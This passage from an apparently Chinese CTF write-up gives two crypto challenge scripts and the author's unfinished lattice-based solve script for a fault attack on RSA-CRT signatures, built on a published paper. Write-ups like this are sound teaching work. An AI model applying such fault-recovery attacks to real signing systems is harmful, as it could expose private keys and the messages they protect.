class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,t):</span><br><span class=\"line\">        d=<span class=\"built_in\">pow</span>(tb,<span class=\"number\">2</span>**t-<span class=\"number\">1</span>-i,p)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> d==<span class=\"number\">1</span>:</span><br><span class=\"line\">            k=<span class=\"number\">0</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            k=<span class=\"number\">1</span></span><br><span class=\"line\">        tb=(tb*<span class=\"built_in\">pow</span>(ta,<span class=\"number\">2</span>*k,p))%p</span><br><span class=\"line\">        h=(h*<span class=\"built_in\">pow</span>(ta,k,p))%p</span><br><span class=\"line\">        ta=<span class=\"built_in\">pow</span>(ta,<span class=\"number\">2</span>,p)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> h*<span class=\"built_in\">pow</span>(a,(s+<span class=\"number\">1</span>)//<span class=\"number\">2</span>,p)%p  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">solve</span>(<span class=\"params\">a,b,c,p</span>):</span><br><span class=\"line\">    tmpa=<span class=\"number\">1</span></span><br><span class=\"line\">    tmpb=b*inverse(a,p)%p</span><br><span class=\"line\">    tmpc=c*inverse(a,p)%p</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> Legendre(tmpb**<span class=\"number\">2</span>*inverse(<span class=\"number\">4</span>,p)-tmpc,p)==<span class=\"number\">1</span></span><br><span class=\"line\">    res1=(amm2(tmpb**<span class=\"number\">2</span>*inverse(<span class=\"number\">4</span>,p)-tmpc,p)-tmpb*inverse(<span class=\"number\">2</span>,p))%p</span><br><span class=\"line\">    res2=(-amm2(tmpb**<span class=\"number\">2</span>*inverse(<span class=\"number\">4</span>,p)-tmpc,p)-tmpb*inverse(<span class=\"number\">2</span>,p))%p</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (res1,res2)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">lift</span>(<span class=\"params\">x,a,b,p</span>):</span><br><span class=\"line\">    tmp=b*(x**<span class=\"number\">2</span>-<span class=\"number\">1</span>)*inverse(a*x,p)%p</span><br><span class=\"line\">    <span class=\"keyword\">return</span> solve(<span class=\"number\">1</span>,-tmp,-<span class=\"number\">1</span>,p)[<span class=\"number\">0</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">p=<span class=\"number\">9410547699903726871336507117271550134683191140146415131394654141737636910570480327296351841515571767317596027931492843621727002889086193529096531342265353</span></span><br><span class=\"line\">a=<span class=\"number\">54733430689690725746438325219044741824500093621550218736194675295708808435509</span></span><br><span class=\"line\">b=<span class=\"number\">75237024593957256761258687646797952793573177095902495908321724558796076392871</span></span><br><span class=\"line\">x=bytes_to_long(flag)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        y=lift(x,a,b,p)</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        x+=<span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">assert</span> a*x*(y**<span class=\"number\">2</span>-<span class=\"number\">1</span>)%p==b*y*(x**<span class=\"number\">2</span>-<span class=\"number\">1</span>)%p</span><br><span class=\"line\"></span><br><span class=\"line\">P=(x,y)</span><br><span class=\"line\">e=<span class=\"number\">65537</span></span><br><span class=\"line\"></span><br><span class=\"line\">eP=mul(e,P)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;P = <span class=\"subst\">&#123;P&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;eP = <span class=\"subst\">&#123;eP&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">P = (56006392793427940134514899557008545913996191831278248640996846111183757392968770895731003245209281149, 5533217632352976155681815016236825302418119286774481415122941272968513081846849158651480192550482691343283818244963282636939305751909505213138032238524899)</span></span><br><span class=\"line\"><span class=\"string\">eP = (mpz(8694229840573103722999959579565187489450818138005222030156495740841851804943200684116883831426548909867463656993852596745698999492932194245562062558787005), mpz(9279986963919197374405152604360936066932975197577643570458423456304679111057526702737279809805694360981565554506626018364382736924914907001214909905449002))</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>这题真的是蚌不住，刚放出来解出数就蹭蹭往上涨，还有点怀疑人生，然后仔细观察题目，一看上面，什么玩意，再看下面，什么玩意。。。<br>直接拿第一个数 <code>long_to_bytes</code> ，得到 flag。</p>\n<h2 id=\"Learning-with-fault\"><a href=\"#Learning-with-fault\" class=\"headerlink\" title=\"Learning with fault\"></a>Learning with fault</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> gmpy2 <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> secrets <span class=\"keyword\">import</span> flag</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">RSA</span>():</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self,p,q,e</span>):</span><br><span class=\"line\">        self.p=p</span><br><span class=\"line\">        self.q=q</span><br><span class=\"line\">        self.e=e</span><br><span class=\"line\">        self.phi=(p-<span class=\"number\">1</span>)*(q-<span class=\"number\">1</span>)</span><br><span class=\"line\">        self.d=invert(self.e,self.phi)</span><br><span class=\"line\">        self.dp=self.d%(p-<span class=\"number\">1</span>)</span><br><span class=\"line\">        self.dq=self.d%(q-<span class=\"number\">1</span>)</span><br><span class=\"line\">        self.n=p*q</span><br><span class=\"line\">        self.N=getPrime(<span class=\"number\">512</span>)*getPrime(<span class=\"number\">512</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">sign</span>(<span class=\"params\">self,message</span>):</span><br><span class=\"line\">        m=bytes_to_long(message)</span><br><span class=\"line\">        sig_p=<span class=\"built_in\">pow</span>(m,self.dp,self.p)</span><br><span class=\"line\">        sig_q=<span class=\"built_in\">pow</span>(m,self.dq,self.q)</span><br><span class=\"line\">        alpha=q*invert(q,p)</span><br><span class=\"line\">        beta=p*invert(p,q)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> long_to_bytes((alpha*sig_p+beta*sig_q)%self.n)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">corrupt_sign</span>(<span class=\"params\">self,message</span>):</span><br><span class=\"line\">        m=bytes_to_long(message)</span><br><span class=\"line\">        sig_p=<span class=\"built_in\">pow</span>(m,self.dp,self.p)</span><br><span class=\"line\">        sig_q=<span class=\"built_in\">pow</span>(m,self.dq,self.q)</span><br><span class=\"line\">        alpha=q*invert(q,p)</span><br><span class=\"line\">        beta=p*invert(p,q)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> long_to_bytes((alpha*sig_p+beta*sig_q)%self.N)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">verify</span>(<span class=\"params\">self,message,sign</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> long_to_bytes(<span class=\"built_in\">pow</span>(bytes_to_long(sign),self.e,self.n))==message</span><br><span class=\"line\"></span><br><span class=\"line\">p=getPrime(<span class=\"number\">512</span>)</span><br><span class=\"line\">q=getPrime(<span class=\"number\">512</span>)</span><br><span class=\"line\">e=<span class=\"number\">65537</span></span><br><span class=\"line\">rsa=RSA(p,q,e)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&quot;sign.txt&quot;</span>,<span class=\"string\">&quot;w&quot;</span>) <span class=\"keyword\">as</span> f1:</span><br><span class=\"line\">    <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&quot;corrupted_sign.txt&quot;</span>,<span class=\"string\">&quot;w&quot;</span>) <span class=\"keyword\">as</span> f2:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">6</span>):</span><br><span class=\"line\">            message=os.urandom(<span class=\"number\">64</span>)</span><br><span class=\"line\">            sign=rsa.sign(message)</span><br><span class=\"line\">            corrupted_sign=rsa.corrupt_sign(message)</span><br><span class=\"line\">            <span class=\"keyword\">assert</span> rsa.verify(message,sign)</span><br><span class=\"line\">            f1.write(<span class=\"built_in\">str</span>(sign)+<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">            f2.write(<span class=\"built_in\">str</span>(corrupted_sign)+<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">enc=<span class=\"built_in\">pow</span>(bytes_to_long(flag),rsa.e,rsa.n)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;n = <span class=\"subst\">&#123;rsa.n&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;N = <span class=\"subst\">&#123;rsa.N&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;e = <span class=\"subst\">&#123;rsa.e&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;enc = <span class=\"subst\">&#123;enc&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">n = 99670316685463632788041383175090257045961799409733877510733415402955763322569510896091638507050126669571444467488936880059210773298729542608112756526719533574432327269721804307073353651955251188547245641771980139488000798458617636759823027148955008149512692983471670488580994385743789385091027299901520585729</span></span><br><span class=\"line\"><span class=\"string\">N = 81332992898551792936282861980393365170738006789835182134055801566584228471896473385776004610279937176800796971820133195300006470892468060034368863410462219133248069442508287516929262751427926825122839525496671527936622212986733708071962237633082743396115729744192159064241674410003857168101669882043743570731</span></span><br><span class=\"line\"><span class=\"string\">e = 65537</span></span><br><span class=\"line\"><span class=\"string\">enc = 2476965183785968993595493003363618829317072815989584886372189393899395623714779397354978469504773556228655475355703015337932838278988328384587983506790841663233499939173166353582189202860394411808445422387063648198432242875738065748287034529713834303346017134249834382745931627301273142828893469374138264396</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>出题论文：<a href=\"https://eprint.iacr.org/2011/388.pdf\">https://eprint.iacr.org/2011/388.pdf</a><br>这题一开始是搜到了论文，瞟了两眼，以为不是，就没看下去了。。。<br>后来学长发给我这篇，我焯了两个钟复现出来了，说不定真有机会现场解出，唉还是太菜。<br>照着论文的 Attack Summary 敲就行了，一开始没理解到 $z$ 向量的意思，直接从格子拿，跑不出来，学长问我 $a$ 和 $b$ 的选取是不是有问题，我才知道要枚举出所有 $x$ 和 $y$ 。然后 $a$ 和 $b$ 在 0 到 10 间选取也不行，改成了 -10 到 10 。<br>exp 如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> tqdm <span class=\"keyword\">import</span> tqdm</span><br><span class=\"line\"><span class=\"keyword\">from</span> itertools <span class=\"keyword\">import</span> combinations</span><br><span class=\"line\"><span class=\"keyword\">from</span> sage.<span class=\"built_in\">all</span> <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> *</span><br><span class=\"line\">co_sig = [<span class=\"string\">b&quot;\\x17\\x8bb3\\x11\\x1b\\xb9\\xb9\\xc6M\\xb0\\xaa\\x07-\\x1ar\\xff\\xfb\\xb4&amp;H7!\\xb8\\xa1\\xce\\x07\\x8b\\x84M\\x0bw=m\\x193Oc\\x97w\\x8f\\xffy4\\xa1\\x99\\xfcW\\xf9|\\xeb\\xa4\\x00\\x1eD*\\xe8-&#x27;\\xa9\\xef\\x9d\\x13*\\xf4\\xbe\\x9d\\x9b&amp;w\\xcb\\xfd\\xb3\\xb6\\xa3n\\xb8\\xb4\\x97vT\\xec@\\x86\\xd1R\\xb0\\n\\xe1uC\\xbc\\x14\\xeb\\xceSu&amp;&#x27;&#123;\\xb9\\x12\\x90\\x82\\xc7,\\xdbr\\xebP\\xe1j\\x11E\\xd5\\x17\\xe1\\xd0D\\xe7z\\x94vt\\xbf\\x1a\\xc4+&quot;</span>,</span><br><span class=\"line\">          <span class=\"string\">b&#x27;\\x1dJ\\xc5\\xb2\\xbe\\x05\\xe6\\xc8T\\n\\xbe&quot;\\xbeU\\xed\\xba\\xec\\x85\\x05\\x8b\\x8ayE\\xa3&#125;0\\x1dk\\xa7\\x10\\xe2E\\x19\\xfe\\x10\\x90\\xef\\r\\xdbV\\x8b\\x87|(\\xd1\\xb5\\xfd\\xb9\\x14\\x84\\x05\\x03\\x81\\xc8\\xf6\\xe5\\x8a\\x92\\xa0\\x01I\\x8aG:\\xc19\\x9e\\xf0\\x8eZ\\\\Yx\\x80|\\xb7\\x80\\x0e\\xcd\\xa3\\xba6\\xf8\\x98\\xb1pB\\x05\\x8aT#\\xbf\\x1e\\x1b~\\xcb\\xf5\\t\\xa2H9\\xc9n\\x81e\\xa2\\x15\\x97\\x11\\xe4\\x93\\xf2\\xe6\\x80\\x97\\x99G\\xb5\\xfe\\x07/\\xd2\\xbd\\xad\\xcf\\x04\\x9e\\xd0&#x27;</span>,</span><br><span class=\"line\">          <span class=\"string\">b&#x27;Gs\\xda\\xb8\\x8a\\x85\\xccK\\xf7\\xa8y\\x16\\xa5\\xf0\\x06\\xbe\\xeb\\x83&amp;&#125;a\\x85q\\x8d:\\x1fSb\\xb8\\xc5\\x84\\xba*[\\xe7\\xbb&#123;\\x86\\xd3\\xb3r\\xb6\\xaaCN\\x93\\x1d&lt;(\\xe2\\x1c;\\x8crU\\x8fD=W\\xa7\\x0b\\xc7\\xeag\\x96\\x06\\xd6\\xbb\\xe4\\x04b\\xd8\\x02\\x12\\xd6\\xfa2\\x1e#\\xf0\\xde\\x8b\\x88M\\xd2\\xf47\\\\\\x98\\xe0\\x04Fu\\x1bsy\\xf2\\xc4\\xad\\xd6Y\\x81u~B:\\xd2\\x1f\\xb3\\xab\\x01:\\xfa\\xdf\\x19J8\\xd0\\x18RN\\xfe,CA\\x15\\xb3\\xe0&#x27;</span>,</span><br><span class=\"line\">          <span class=\"string\">b&quot;0I\\xda5\\x9f\\x05v\\x17\\xdc\\xd4q\\xd6\\x83,\\x9d\\r\\xccc\\x8a\\xa1\\xd4U\\xd3\\x18\\xc9\\xc6g\\xcd\\nX\\x99Ah\\xed&#125;\\xf3\\xb1(\\xd5I\\xc6\\x0f@yw9\\x9d\\xfdv\\x15x\\xeaRA\\xd6\\xb0\\x1e\\xb5B\\xe5\\x05cc\\x06m\\xf4NN&#x27;\\x02q\\x1a\\x11\\xe4\\x87P:\\xc8\\x11a\\x9f\\xbd\\x9c\\x98x\\xda\\xea\\xc4\\xa8f\\x89s\\xcaJ\\x7f\\xeb\\xd8\\xc1G#\\xf4\\xdc\\xe2\\x01\\xf2\\xa5\\x95\\x19`)2!\\xf5\\xb9\\xf0\\xf2\\xbb\\xf8\\x0bF&amp;&amp;`\\xfd*\\xe1\\xf2\\x9c&quot;</span>,</span><br><span class=\"line\">          <span class=\"string\">b&#x27;:\\x99/Hxt\\xd1\\xd4\\xaaB\\xd6H\\x16\\xe1\\xc9\\xe2\\xb3\\xc3\\xa9b\\xd3\\x96\\x9c\\x05x6\\xf1\\xc3d\\xa2\\xd1U+.\\x1b\\xac^\\xf6Mh7\\xb7\\x03\\x8e\\xdc\\xca\\x0bn\\xac\\xed\\x92\\xb8x\\x04)\\x0f|\\x11\\xcc\\xfa\\xf2\\\\\\xba\\xee\\xc4X\\xa8(\\x05\\xf2\\xb5\\x8f&amp;\\xf3\\xff\\x1eB\\xe7\\x94\\xf4\\xa6\\x00!\\xe5v\\xd9x\\xf0s\\x94\\xf4D(\\xa9g\\x118\\xa7z\\x83\\xad\\xdb\\xe6\\xe3\\xe7\\xf8\\xf2\\xef\\xe5@\\xe9\\x13\\x00OB\\xcc\\x05\\xd1,_=\\xd2/Og\\x81\\xa6+&#x27;</span>,</span><br><span class=\"line\">          <span class=\"string\">b&#x27;\\x1c|\\xb6\\xcc\\xdfj\\xc5\\xa0s\\xac w\\xa6\\xf2\\x87D\\xe3\\xf9Y\\xf5=\\xf0\\x0b\\xd9\\xea\\x89,+e\\x1e\\xb7m#\\x99\\xd1\\x87\\x17Z\\xed\\x1d\\xc8\\x97;\\xa0K\\x05.\\xaa&lt;\\xc6s\\xcf\\xa2\\xa2\\\\PO\\x12&amp;\\xb4\\x11\\xec\\xad\\x10\\xf8\\xf7\\xd1\\xd3_\\x80\\x17\\xe0\\x1eP\\x93\\xe3\\xc2\\x1e\\x03\\xea]^\\xc6a\\x9c\\xcb\\x90\\xbb\\x9f\\x8by\\xa5dhM\\xce\\xc7\\xbc\\xf7\\xafe\\xcf\\xc1\\xf1\\x18@\\x1e\\xe2\\xdb\\xfb\\xe4^\\xc8\\xe7\\x19\\xccnY\\xc6o\\x7fL\\x9fV\\xd4\\xc4\\x15\\xe8&#x27;</span>,</span><br><span class=\"line\">          ]</span><br><span class=\"line\">sig = [<span class=\"string\">b&#x27;\\t\\x8b\\xde\\x98\\x84\\x1d\\x9e\\xd4\\xa0\\xb7f\\xe0\\x05\\xb1\\xbd8\\xb9G\\xe3\\x0c\\x83\\x8a\\xe5\\xf0G7\\x12\\x1eT\\x85o-B\\xe4_\\xd2\\x04\\xd9:\\xab\\xdf\\xa1 \\x8f\\xedt+\\x0f\\xce\\xb5\\x90\\xaaK\\xf0U~v=\\x84\\xe7$G\\xf5\\xfb\\xd3ok~V\\x1a\\xec&amp;\\x15\\x18Y\\x0c\\x80u\\xafF\\xf1\\x10\\x9f\\xf2\\xe6\\xa6\\x9a\\xbb\\xbd+\\xa4l\\xa9\\x11\\xd5\\t\\x13\\x16\\xa3\\xde\\xe1\\xdfZ\\xa9$r\\xb5`\\xc9&quot;\\x11\\xab\\xc5\\x87\\xc4\\x1d@\\x9e\\xa4t\\xdb#\\xbdj\\xcb\\x95\\xefK&#x27;</span>,</span><br><span class=\"line\">       <span class=\"string\">b&#x27;z/\\xd6\\xfb\\xd8\\xfa\\xc4\\xed\\xbd\\x99\\xd0\\xa0\\x90\\xcb\\xca\\x83\\xd8B\\xa7\\xf4\\xbd\\xe0\\xc2&amp;\\x1aQl(\\xd6p\\x8f\\x89=tT\\xf1(\\xeb\\xab\\x84[oR\\x1fl=\\xda\\xf5\\x18q\\x8f\\xa7k\\x00\\x1b\\x1a\\x0ei\\x1fa.ho\\x15\\x04\\x12\\xe4\\xc2\\xd7\\x19\\x92\\xc3\\x9b\\xfe\\xd5\\xb6R\\xf8\\x95\\x9fr\\x93\\xddD\\x1c[\\x873\\xd5\\x06\\x1b\\xa5\\x82/6\\x9a\\x13\\xcf\\xa4\\xcd\\x0e]\\t\\xad?\\xd6\\x84\\r\\x90\\xef\\x86\\xf15)\\xe34\\xf7\\xb77\\xef\\x0c&amp;\\xdb8\\xa6\\xe0\\xa5a&#x27;</span>,</span><br><span class=\"line\">       <span class=\"string\">b&#x27;U\\x0b\\xf6\\x9cm])1\\xe2\\xad\\xf9G\\x8f\\xa2\\xbc&#125;\\xd7\\x18\\x89\\xa4\\xfdFQ\\x80m&quot;\\xf9\\to^\\xd9A\\x98\\xd2\\xca\\x1e(b\\xa8\\xbe\\xc2m\\xf7\\n[O\\x00\\xbc\\x87\\x17\\xed\\x0cG\\xf2=H\\x0e\\xc0\\x14+\\xcb\\xd0\\x1feT2\\xf2Th\\xec\\xc2\\xcf&gt;6,&lt;\\x88X\\x8f\\xe9g\\xa8\\x00\\xafr\\x05\\x95\\rj\\x9c\\xc6\\n\\xbb\\x8a\\x019\\xc1\\x1ef#\\x02[Rh\\xd8\\xdc|&#123;6\\xeb\\xe8U\\x91\\xa4\\xeb&#125;\\xf4s;E\\xe72$i\\xdft\\xff\\&#x27;&#x27;</span>,</span><br><span class=\"line\">       <span class=\"string\">b&#x27;[\\x94\\x95T\\xf4\\xc4\\xca\\x8drO\\x80\\x14\\xc9&lt;H\\xa2a\\xdc\\xf4`\\xac&gt;\\xab\\x03\\xfa\\x80Sx\\x99\\x14\\x83$U\\x0b\\xfa\\x8fv\\xfd\\xda\\x1a\\xa0\\xebY\\xaa\\x01\\xe2XsG\\t\\xcf\\xae\\xa0\\xbf\\x82iG\\tQ \\xb1\\xfe\\xa5k\\x12\\xd9\\x12\\xf7\\x95\\xa3\\xa5\\x8d`z\\x19\\x1a\\x90-\\x9aj\\x15\\xf6f&gt;\\x18\\x08\\xb8\\x1f\\x88\\x1a\\x80Th\\xd0\\x15\\x9bw#\\&#x27;`K\\xa5\\xf1\\xbf&quot;\\xe79\\xaf\\xc7z%p\\xa5\\x9f\\x14\\xef\\&#x27;1\\x11\\x05Gg\\xe9\\xda\\xc9\\x18~[&#x27;</span>,</span><br><span class=\"line\">       <span class=\"string\">b&#x27;:\\xefRE\\xd7\\xa1?\\xf3\\xb5\\xf7\\xdd\\xe2\\xb6~\\x85014\\xc0\\x8a\\x80\\xe1\\xb5#\\x94\\x10\\xb2\\xa0\\xfe\\x87\\xd1t\\xc3$&amp;\\xde8\\x195\\xcd\\xf4@3\\x15\\xcaK\\xcc\\xcd\\r:\\x83*\\xd7l\\xb6\\xf2&#125; \\tJ\\xb5xKfjh.\\xfb\\xb5\\x91\\xc6\\xf2x\\x8e\\x83\\xdc\\xc3\\xef\\x8b\\x8dW\\xa6\\xa6\\xb0w\\xd8\\xf2G\\xa5-\\xc3\\x87\\x17;\\xedH`:\\xcd\\x08ts\\x9eqPE\\xd7\\xfc\\xc4\\x98\\xb5\\xe0\\xad\\xb7A\\x7f\\xcb\\x01\\xbd\\x98\\xd3Ea\\xb9\\x07\\x80\\xf8\\x19&#x27;</span>,</span><br><span class=\"line\">       <span class=\"string\">b&quot;8\\xca\\x7f!;\\\\\\xde\\x1b\\x80i\\x9b!\\x1c??u\\x13\\x955\\xd0xG\\xff\\xd7\\xba\\xfe+\\x95\\x0eu^\\x15\\x1a\\x0e*\\xfe\\x8a\\xafM\\xc0\\xd1Ty\\xd7\\xf1\\xa7@\\xd6\\xa6\\xee\\x0c:It\\x1a\\xeag\\xfc\\x0c\\xaf\\x02&lt;\\x03T)\\xeb\\xb0\\x15\\x1cz\\x85\\x992\\xa9\\xbe\\x9bm\\xc4D\\x83\\xf7\\xb5T\\xdd9?\\x94\\xd4\\x13\\xb4\\xb3\\x8d\\xa9\\x92\\x9dt\\x86\\xdb\\x0b$\\x19l\\xb1\\xb9\\x05&#x27;o\\xf3!\\t\\x01\\x93&#x27;z\\x15P\\x88\\xd7iN\\n\\x8bA\\xb5\\xd2&#125;\\xe8\\x10&quot;</span></span><br><span class=\"line\">       ]</span><br><span class=\"line\">n = <span class=\"number\">99670316685463632788041383175090257045961799409733877510733415402955763322569510896091638507050126669571444467488936880059210773298729542608112756526719533574432327269721804307073353651955251188547245641771980139488000798458617636759823027148955008149512692983471670488580994385743789385091027299901520585729</span></span><br><span class=\"line\">N = <span class=\"number\">81332992898551792936282861980393365170738006789835182134055801566584228471896473385776004610279937176800796971820133195300006470892468060034368863410462219133248069442508287516929262751427926825122839525496671527936622212986733708071962237633082743396115729744192159064241674410003857168101669882043743570731</span></span><br><span class=\"line\">e = <span class=\"number\">65537</span></span><br><span class=\"line\">enc = <span class=\"number\">2476965183785968993595493003363618829317072815989584886372189393899395623714779397354978469504773556228655475355703015337932838278988328384587983506790841663233499939173166353582189202860394411808445422387063648198432242875738065748287034529713834303346017134249834382745931627301273142828893469374138264396</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">orthogonal_lattice</span>(<span class=\"params\">B</span>):</span><br><span class=\"line\">    _d, _n = B.nrows(), B.ncols()</span><br><span class=\"line\">    _c = <span class=\"number\">2</span> ** <span class=\"built_in\">min</span>(((_n-<span class=\"number\">1</span>)/<span class=\"number\">2</span>+(_n-_d)*(_n-_d-<span class=\"number\">1</span>)/<span class=\"number\">4</span>), <span class=\"number\">20</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> b <span class=\"keyword\">in</span> B:</span><br><span class=\"line\">        _c *= b.norm()</span><br><span class=\"line\">    B_bot = (ceil(_c)*B).stack(identity_matrix(ZZ, _n))</span><br><span class=\"line\">    B_r = B_bot.transpose().LLL()</span><br><span class=\"line\">    LB = B_r.matrix_from_rows_and_columns(<span class=\"built_in\">range</span>(_n-_d), <span class=\"built_in\">range</span>(_d, _n+_d))</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> (B*LB.transpose()).is_zero()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> LB</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">v = [crt([bytes_to_long(co_sig[i]), bytes_to_long(sig[i])], [N, n])</span><br><span class=\"line\">     <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">6</span>)]</span><br><span class=\"line\"></span><br><span class=\"line\">Lv = orthogonal_lattice(matrix(ZZ, v))</span><br><span class=\"line\"></span><br><span class=\"line\">result = orthogonal_lattice(Lv.matrix_from_rows(<span class=\"built_in\">range</span>(<span 